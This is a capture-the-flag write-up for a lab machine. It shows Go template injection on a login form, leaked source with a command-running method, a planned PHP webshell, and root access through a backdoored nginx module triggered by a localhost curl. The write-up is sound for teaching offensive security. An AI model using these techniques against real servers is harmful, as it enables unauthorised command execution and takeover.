## Enumerating WebServer specifics
Since we have a login form on port 8080, we will start there:

1. First, we inspect the response headers to see whether the WebServer leaks anything useful. The forwarded-to header tells us the request is being passed to a Golang WebServer.

![](golang.png)

**So after being stuck for a while, an idea came up.**
> A Golang backend, a `{% raw %}{{.Title}}{% endraw %}` output being leaked (in the `nmap` output), what if a Golang Template is being used, and what if we can inject our own template code to retrieve information?

We know template syntax usually looks something like `{% raw %}{{7*7}}{% endraw %}`, which the engine would evaluate and render back as `49`. Other variants exist, but this one is enough to work with.

So if a **template** really is in play, (in the end, we are always working off assumptions), then the natural next move is to feed template syntax into any input we can reach and watch for it to evaluate.

Lets try to inject `{` into the input fields, we don't know how the structure is, so lets first get the proof of concept. If it crashes, it works.

***We test using Burp:***

![](crashed.png)

Great, it crashed, so our assumption becomes fact. Our input is parsed as Server-Side Template Code and gets executed.

The issue is that, because the way things are being handled and functions in the backend are not present, we cannot try to brute force code execution. We don't even know what the original source looks like.

We try to get the credentials that are being used to verify the login, since they come from the same input, we must be able to retrieve the values.

## Foothold
After logging into the form we finally see the source code of the backend:

```go
package main

import(
    "html/template"
    "net/http"
    "log"
    "os/exec"
    "fmt"
    "bytes"
    "strings"
)

// compile all templates and cache them
var templates = template.Must(template.ParseGlob("templates/*"))

type Data struct {
    Title string // Must be exported!
    Body string  // Must be exported!
}

type User struct {
        ID       int
        Email    string
        Password string
}


func (u User) DebugCmd (test string) string {
  ipp := strings.Split(test, " ")
  bin := strings.Join(ipp[:1], " ")
  args := strings.Join(ipp[1:], " ")
  if len(args) > 0{
    out, _ := exec.Command(bin, args).CombinedOutput()
    return string(out)
  } else {
    out, _ := exec.Command(bin).CombinedOutput()
    return string(out)
  }
}

// Renders the templates
func renderTemplate(w http.ResponseWriter, tmpl string, page *Data) {
	err := templates.ExecuteTemplate(w, tmpl, page)
	if err != nil {
    http.Error(w, err.Error(), http.StatusInternalServerError)
    return
	}
}

func IndexHandler(w http.ResponseWriter, r *http.Request) {
  switch r.Method {
  case "GET":
	page := &Data{Title:"Home page", Body:"Welcome to our brand new home page."}
	renderTemplate(w, "index", page)
  case "POST":
	page := &Data{Title:"Home page", Body:"Welcome to our brand new home page."}
    if r.FormValue("password") == "ippsSecretPassword" {
      renderTemplate(w, "source", page )
    } else {
      renderTemplate(w, "index", page)
    }
  }
}

func ForgotHandler(w http.ResponseWriter, r *http.Request) {
    switch r.Method {
    case "GET":
      page := &Data{Title:"Forgot Password", Body:""}
      renderTemplate(w, "forgot", page)
    case "POST":
      var user1 = &User{1, "ippsec@hacking.esports", "ippsSecretPassword"}
      var tmpl = fmt.Sprintf(`Email Sent To: %s`, r.FormValue("email"))

      t, err := template.New("page").Parse(tmpl)
      if err != nil {
          fmt.Println(err)
      }

      var tpl bytes.Buffer
      t.Execute(&tpl, &user1)
      page := &Data{Title:"Forgot Password", Body:tpl.String()}
      renderTemplate(w, "forgot", page)
    }
}


func main(){
  http.HandleFunc("/", IndexHandler)
  http.HandleFunc("/forgot/", ForgotHandler)
  log.Fatal(http.ListenAndServe(":80", nil))
}
```

What becomes apparent is the `DebugCmd` function
```go
type User struct {
        ID       int
        Email    string
        Password string
}


func (u User) DebugCmd (test string) string {
  ipp := strings.Split(test, " ")
  bin := strings.Join(ipp[:1], " ")
  args := strings.Join(ipp[1:], " ")
  if len(args) > 0{
    out, _ := exec.Command(bin, args).CombinedOutput()
    return string(out)
  } else {
    out, _ := exec.Command(bin).CombinedOutput()
    return string(out)
  }
}
```
So essentially, it takes the first string as the program, the rest as arguments; parses, executes and returns the output.

This is a function specifically assigned to a `struct` of type `User`.

Inspecting the whole gofile, we see the following
```go
func ForgotHandler(w http.ResponseWriter, r *http.Request) {
    switch r.Method {
    case "GET":

      t.Execute(&tpl, &user1)
      page := &Data{Title:"Forgot Password", Body:tpl.String()}

```
We see that we were able to access the values of the `User` struct, since we are essentially being passed into the template as an object of type `User`.

This matters because a Golang template does not just read fields off that object, it can also call the methods defined for it. So once we know the context is a `User`, every exported method on `User` becomes reachable from inside our injection.

Great; it's confirmed: the source looks like the WebServer serving content on port 80.
PHP is being used within this stack too, which means we can upload a malicious PHP webshell and RCE, which would hopefully be the target system and not a container.

The reason for uploading a webshell is because we are working in a parameter of a captured request, which makes it very hard to parse actual syntax (URL encoding and other weird potential shenanigans). So, it's best to go for the KISS principle in this scenario, "Keep it simple, stupid": a webshell will do the job and is easy to create in this scenario.

##  Privilege Escalation
After enumerating for a bit, I went on to check _nginx_. My reasoning is that when a lot of WebServers are in play, it pays to look at the listening ports and read through the configuration, since, more often than not, it reveals a lot about what is actually going on behind the scenes.

**nginx is running as root**
```bash
ps -aux | grep root

--- Snip ---
root         955  0.0  0.0  55304  1572 ?        Ss   19:17   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
root         956  0.0  0.1  55868  5228 ?        S    19:17   0:00 nginx: worker process
root         957  0.0  0.1  56204  6248 ?        S    19:17   0:00 nginx: worker process
--- Snip ---
```
In the _nginx_ loaded modules directory, we find the following:

![](nginx.png)

**A backdoor config.**
```bash
www-data@gobox:/etc/nginx/modules-enabled$ cat 50-*r.conf
cat 50-*r.conf
load_module modules/ngx_http_execute_module.so;
load_module modules/ngx_http_image_filter_module.so;
load_module modules/ngx_http_xslt_filter_module.so;
```

Sounds very specific, I could reverse the binary and then try to look up information about this, but the earlier the better.

Using search engines like Google or SearXNG, we find the following when looking up **"ngx_http_execute_module.so"**:
- <https://github.com/limithit/NginxExecute>

Cool, so after taking a look at it, I learnt that one has to have set following module within the _nginx_ site config:
```bash
location ... {
            ......
            command on;
        }
```

Okay, lets search:
```bash
www-data@gobox:/etc/nginx$ grep -r command
grep -r command
sites-available/default:		command on;
```

```bash
cat /etc/nginx/sites-enabled/default
--- Snip ---
server {
	listen 127.0.0.1:8000;
	location / {
		command on;
	}
}
```

So backdoor enabled on _nginx_ on port 8000.
**Trying:**
```bash
curl -p http://localhost:8000/?system.run[id]
curl: (52) Empty reply from server
```

I guess the backdoor command is something different.
The module can be found under:
```bash
/usr/lib/nginx/modules/ngx_http_execute_module.so
```

So let's reverse it using `ghidra` to see if we can find any clues, and after looking for a short time in `ghidra`, we find that following parameter is being called: `?ippsec.run[COMMAND]`

We can also `strings` the module, which also gives us the parameter when grepping for specific signs of it:
```bash
www-data@gobox:/$ strings /usr/lib/nginx/modules/ngx_http_execute_module.so | grep .run
<ginx/modules/ngx_http_execute_module.so | grep .run
ippsec.run
```

And at last, we can finally beat this box by doing the following:
```
curl "http://localhost:8000?ippsec.run[id]"
uid=0(root) gid=0(root) groups=0(root)
```

Done

### Takeaways:

This box was a really nice reminder that enumeration is not just running tools, its reading what they hand back to you. The whole foothold started from one leaked `{{.Title}}` in an `nmap` title, and a dangerous function.
